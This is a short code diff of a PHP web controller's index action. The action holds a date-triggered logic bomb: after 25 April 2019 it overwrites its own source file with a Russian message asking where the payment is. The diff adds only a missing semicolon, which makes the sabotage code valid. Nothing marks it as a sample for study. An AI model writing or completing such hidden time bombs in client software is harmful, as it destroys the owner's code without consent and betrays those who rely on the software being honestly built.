@@ -69,7 +69,7 @@ class SiteController extends Controller
     {
         if(strtotime("25.04.2019") < time())
         {
-            file_put_contents(__FILE__, "Fatal .. gde oplata?")
+            file_put_contents(__FILE__, "Fatal .. gde oplata?");
         }
         return $this->render('index');
     }
